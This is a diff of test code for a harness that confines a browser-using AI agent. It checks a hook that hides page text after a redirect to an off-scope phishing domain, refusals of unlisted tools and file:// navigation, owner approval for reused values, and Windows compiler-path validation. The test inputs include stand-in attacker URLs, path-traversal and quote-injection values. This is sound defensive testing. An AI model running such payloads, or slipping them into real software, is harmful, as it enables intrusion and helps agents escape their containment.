+    expect(responseText({ content: [{ type: "text", text: "a" }, { type: "text", text: "b" }] })).toBe("a\nb");
+    // read-guard's run: a refusal prints a block that replaces the answer; an allow prints nothing; no log, or a log it can't write, refuses.
+    const dir = mkdtempSync(join(tmpdir(), "readguard-"));
+    const env = { PCW_NAV_ALLOW: JSON.stringify([CANARY_URL, "https://example.com/account/settings"]), PCW_NAV_DOMAINS: '["example.com"]', PCW_NAV_CANARY: JSON.stringify([CANARY_URL]),
+      PCW_NAV_LOG: join(dir, "log.jsonl") };
+    let said = "";
+    expect(await readGuardMain(env, async () => readCall("https://evil.example/x"), (x) => { said += x; })).toBe(0);
+    expect(JSON.parse(said)).toEqual({ decision: "block", reason: READ_DRIFT_MESSAGE, hookSpecificOutput: { hookEventName: "PostToolUse", updatedMCPToolOutput: READ_DRIFT_MESSAGE } });
+    said = "";
+    expect(await readGuardMain(env, async () => readCall("https://example.com/account/settings", "r2"), (x) => { said += x; })).toBe(0);
+    expect(said).toBe("");
+    expect(readNavLog(env.PCW_NAV_LOG).map((d) => [d.id, d.decision, d.why])).toEqual([["r1", "deny", "read_drift"], ["r2", "allow", "read_on_scope"]]);
+    said = "";
+    await readGuardMain({ ...env, PCW_NAV_LOG: "" }, async () => readCall("https://example.com/account/settings"), (x) => { said += x; });
+    expect(said).toContain("updatedMCPToolOutput");
+    said = "";
+    await readGuardMain(env, async () => "{not json", (x) => { said += x; });
+    expect(said).toContain("updatedMCPToolOutput");
+    // The real command, as the session's settings start it: a block on stdout, exit 0.
+    const r = spawnSync(process.execPath, [join(OPT, "pcjobs/worker.ts"), "read-guard"], { input: readCall("https://evil.example/y", "r9"), env: cleanEnv(env), encoding: "utf8", timeout: 30_000 });
+    expect(r.status).toBe(0);
+    expect(JSON.parse(r.stdout).hookSpecificOutput.updatedMCPToolOutput).toBe(READ_DRIFT_MESSAGE);
+    // The pinned settings carry it, and a settings file without it is untrusted.
+    const settings = JSON.parse(readFileSync(SESSION_FILES.settings, "utf8"));
+    expect(settings.hooks.PostToolUse).toEqual([{ matcher: READ_MATCHER, hooks: [{ type: "command", command: READ_GUARD_COMMAND, timeout: 30 }] }]);
+    expect(allowedTools(settings)).not.toBeNull();
+    expect(allowedTools({ ...settings, hooks: { PreToolUse: settings.hooks.PreToolUse } })).toBeNull();
+    expect(allowedTools({ ...settings, hooks: { ...settings.hooks, PostToolUse: [{ matcher: ".*", hooks: [{ type: "command", command: READ_GUARD_COMMAND, timeout: 30 }] }] } })).toBeNull();
+  });
+
+  test("a redirect after an allowed navigation, then a read: the read is refused, the page text never reaches the model, and the run fails as read_drift", async () => {
+    const { q, id } = oneJob();
+    // The site sends the allowed start address on to another domain (the navigation itself was allowed: the browser followed the redirect).
+    q.say((_i, canary) => ({ canary, outcome: "seen", final_url: "https://example.com/account/settings", facts: { signed_in: true } }));
+    const seen: string[] = [];
+    q.runExtra(async (b) => {
+      const tab = b.group[0];
+      await b.use("navigate", { tabId: tab.id, url: "https://example.com/account/settings" }, "https://login.evil.example/phish?t=planted");
+      seen.push((await b.use("get_page_text", { tabId: tab.id })).text);
+    });
+    expect(await run(q.opts(attended))).toMatchObject({ code: "read_drift", job: id });
+    expect(seen).toEqual([READ_DRIFT_MESSAGE]);
+    const log = readNavLog(join(q.home, "nav-decisions.jsonl"));
+    expect(log.filter((d) => d.why === "read_drift")).toMatchObject([{ phase: "post", decision: "deny", url: null, domain: "evil.example" }]);
+    expect(readFileSync(join(q.home, "nav-decisions.jsonl"), "utf8")).not.toContain("planted");
+    expect(result(q, id)).toMatchObject({ status: "failed", code: "read_drift", facts: {} });
+    // A run's page read with no read-guard decision went past the check: hook_missing_decision.
+    const st = parseStream(stream([ev.init(GIVEN), ev.use("u1", `${CH}get_page_text`, { tabId: 1 }), ev.res("u1", false, "URL: https://example.com/a")]));
+    const pre = [{ id: "u1", tool: "get_page_text", url: null, decision: "allow" as const, why: "reads" }];
+    expect(guardCheck(st, pre, [], undefined, true)).toMatchObject({ code: "hook_missing_decision", missing: ["u1"] });
+    expect(guardCheck(st, [...pre, { ...pre[0], why: "read_on_scope", phase: "post" as const }], [], undefined, true).code).toBeNull();
+  });
+
+  test("only owed-tab-context refusals count toward the trip; an allowed read resets the count; scheme, domain, not-ready and unlisted-tool refusals never count", async () => {
+    const a = (tool: string, id: string) => ({ id, tool, url: null, decision: "allow" as const, why: "x" });
+    const r = (tool: string, id: string, why: string) => ({ id, tool, url: null, decision: "deny" as const, why });
+    // Owed refusals, with each other kind of refusal between them: only the owed ones count, and the others don't reset the run.
+    const mixed = [a("tabs_create_mcp", "1"), r("find", "2", "context_owed"), r("navigate", "3", "scheme_not_allowed"), r("navigate", "4", "domain_not_allowed"),
+      r("find", "5", "inventory_not_ready"), r("Bash", "6", "tool_not_allowed"), r("find", "7", "context_owed")];
+    expect(contextStreaks(mixed, false)).toEqual({ owed: true, current: 2, longest: 2 });
+    // Each kind alone, many times over, never trips.
+    for (const why of ["scheme_not_allowed", "domain_not_allowed", "inventory_not_ready", "tool_not_allowed", "private_address", "ip_address", "read_drift"])
+      expect([why, contextStreaks([a("tabs_create_mcp", "1"), ...Array.from({ length: 6 }, (_, i) => r("find", `x${i}`, why))], false).longest]).toEqual([why, 0]);
+    // An allowed read sets the count back to zero; the tab context does too.
+    const reset = [r("find", "1", "context_owed"), r("find", "2", "context_owed"), a("get_page_text", "3"), r("find", "4", "context_owed"), r("find", "5", "context_owed"),
+      a("tabs_context_mcp", "6"), r("find", "7", "context_owed")];
+    expect(contextStreaks(reset, false)).toEqual({ owed: false, current: 1, longest: 2 });
+    // read-guard's post decisions never count or reset.
+    expect(contextStreaks([r("find", "1", "context_owed"), { ...a("get_page_text", "2"), phase: "post" as const }, r("find", "3", "context_owed"), r("find", "4", "context_owed")], false).longest).toBe(3);
+    // Through the real hook: a new tab, then three unlisted tools while the context is owed: refused, but no trip.
+    const dir = mkdtempSync(join(tmpdir(), "trips-"));
+    const env = { PCW_NAV_ALLOW: JSON.stringify(["https://example.com/a"]), PCW_NAV_LOG: join(dir, "log.jsonl"), PCW_NAV_DOMAINS: '["example.com"]', PCW_RESOLVE: "0", ...markerEnv(dir) };
+    const call = (id: string, tool: string, input: any = {}) => hookMain(env, async () => JSON.stringify({ session_id: SID, tool_use_id: id, tool_name: tool.includes("__") || tool === "Bash" ? tool : CH + tool, tool_input: input }), () => {}, () => {});
+    expect(await call("h1", "tabs_create_mcp", { url: "https://example.com/a" })).toBe(0);
+    for (const id of ["h2", "h3", "h4"]) expect(await call(id, "Bash", { command: "x" })).toBe(2);
+    expect(await call("h5", "navigate", { url: "file:///C:/x" })).toBe(2);
+    const log = readNavLog(env.PCW_NAV_LOG);
+    expect(log.map((d) => d.why)).toEqual(["run_address", "tool_not_allowed", "tool_not_allowed", "tool_not_allowed", "context_owed"]);
+    expect(contextStreaks(log, false)).toMatchObject({ current: 1, longest: 1 });
+  });
+
+  test("report values: the refusal is a mitigation, the pinned domains are the control, and a follow-up job reuses a reported value only on the owner's recorded yes", () => {
+    // The boundary says so, under a new version the owner accepts again.
+    expect(BOUNDARY_VERSION).toBe("2");
+    expect(BOUNDARY_TEXT).toContain("mitigation, not a guarantee");
+    expect(BOUNDARY_TEXT).toContain("domains your signed allowlist entry names");
+    const q = queueRig();
+    const cf = join(q.home, "confirmed.json");
+    writeFileSync(cf, JSON.stringify({ ...JSON.parse(readFileSync(cf, "utf8")), boundary_version: "1" }));
+    expect(browserPreflight(q.opts(attended), q.inst)).toBe("boundary_not_accepted");
+    // The job format: owner_reuse is null, or the values and his answer in quotes.
+    const reuse = { values: ["****plnt"], go: "\u201cyes, check that account\u201d" };
+    expect(parseJob(jobText(job({ owner_reuse: reuse }))).ok).toBe(true);
+    for (const bad of [{ values: [], go: reuse.go }, { values: ["****plnt"], go: "yes" }, { values: ["a"], go: reuse.go }, { values: ["****plnt"], go: reuse.go, extra: 1 },
+      { values: ["1", "2", "3", "4"].map((x) => x.repeat(4)), go: reuse.go }])
+      expect([bad, parseJob(jobText(job({ owner_reuse: bad as any }))).ok]).toEqual([bad, false]);
+    // The keeper: refused without it, refused when it names only some of the carried values, queued when it names them all.
+    const values = ["****plnt", "https://example.com/account/security"];
+    expect(unapprovedValues({ ...READ, done_looks_like: "Check ****plnt" }, values)).toEqual(["****plnt"]);
+    expect(unapprovedValues({ ...READ, done_looks_like: "Check ****plnt", owner_reuse: reuse }, values)).toEqual([]);
+    expect(unapprovedValues({ ...READ, done_looks_like: "Check ****plnt at example.com/account/security", owner_reuse: reuse }, values)).toEqual(["https://example.com/account/security"]);
+    expect(unapprovedValues({ ...READ, done_looks_like: "Check ****plnt", owner_reuse: { ...reuse, go: "not quoted" } }, values)).toEqual(["****plnt"]);
+    expect(jobFromAsk({ ...READ, owner_reuse: reuse }, T0, "j-20261115-reuse1")).toMatchObject({ ok: true, value: { owner_reuse: reuse } });
+    expect(jobFromAsk({ ...READ }, T0, "j-20261115-reuse2")).toMatchObject({ ok: true, value: { owner_reuse: null } });
+  });
+
+  test("the Windows helper: the compiler under the system root only, clear codes when it is missing or blocked, both hashes recorded and checked", () => {
+    // Framework64 first, then Framework, under SystemRoot; WINDIR and PATH are never used; a strange SystemRoot falls back to C:\\Windows.
+    expect(cscCandidates({ SystemRoot: "D:\\Win", WINDIR: "E:\\evil", PATH: "C:\\tools" })).toEqual(["D:\\Win\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe", "D:\\Win\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe"]);
+    expect(systemRoot({ WINDIR: "E:\\evil" })).toBe("C:\\Windows");
+    for (const bad of ["relative\\Windows", "\\\\server\\share", "C:\\Windows\\..\\evil", "C:\\Win\"dows", ""]) expect([bad, systemRoot({ SystemRoot: bad })]).toEqual([bad, "C:\\Windows"]);
+    // No compiler there: its own code, at the preflight too.
+    const q = queueRig();
+    expect(jobHelperState(q.opts({ platform: "win32", jobHelper: undefined, csc: () => null }))).toEqual({ exe: null, code: "helper_compiler_missing" });
+    expect(containmentProblem(q.opts({ platform: "win32", jobHelper: undefined, csc: () => null }))).toBe("helper_compiler_missing");
+    expect(browserPreflight(q.opts({ ...attended, platform: "win32", jobHelper: undefined, csc: () => null }), q.inst)).toBe("helper_compiler_missing");
+    // A compiler path that can't be started at all (not there): containment_unavailable.
+    expect(jobHelperState(q.opts({ platform: "win32", jobHelper: undefined, csc: () => join(q.root, "no-such-csc.exe") })).code).toBe("containment_unavailable");
+    // The build record: both hashes, or nothing.
+    const stamp = join(q.root, "stamp");
+    writeFileSync(stamp, JSON.stringify({ source_sha256: "a".repeat(64), exe_sha256: "b".repeat(64) }));
+    expect(readStamp(stamp)).toEqual({ source_sha256: "a".repeat(64), exe_sha256: "b".repeat(64) });
+    writeFileSync(stamp, "a".repeat(64) + "\n");               // the old one-hash record: rebuilt
+    expect(readStamp(stamp)).toBeNull();
+    // Cain's reader names the fix for each.
+    for (const code of ["helper_compiler_missing", "helper_blocked"] as const)
+      expect(heartbeatNotice({ v: 1, worker_clock: T0.toISOString(), code, job: null, stale_lock: false, skew_ms: null, reason: null })).toMatch(new RegExp(`${code} row`));
+  });
+
+  test.skipIf(WIN)("the Windows helper: a compiler the system refuses to start is helper_blocked; a wrapper that doesn't contain fails the kill check", async () => {
+    const q = queueRig();
+    const csc = join(q.root, "csc.exe");
+    writeFileSync(csc, "not runnable");
+    chmodSync(csc, 0o644);
+    expect(jobHelperState(q.opts({ platform: "win32", jobHelper: undefined, csc: () => csc }))).toEqual({ exe: null, code: "helper_blocked" });
+    // A "helper" that only runs its program, with no job around it: ending it leaves the program's detached child running.
+    const fake = join(q.root, "fake-helper.sh");
+    writeFileSync(fake, "#!/bin/sh\nshift\nexec \"$@\"\n");
+    chmodSync(fake, 0o755);
+    const line = await jobObjectCheck(q.opts(), fake);
+    expect(line).toMatchObject({ helper: true, kill_tree_gone: false, passed: false });
+    expect(KILL_INTERMEDIARY).toContain("detached: true");
   });
 });
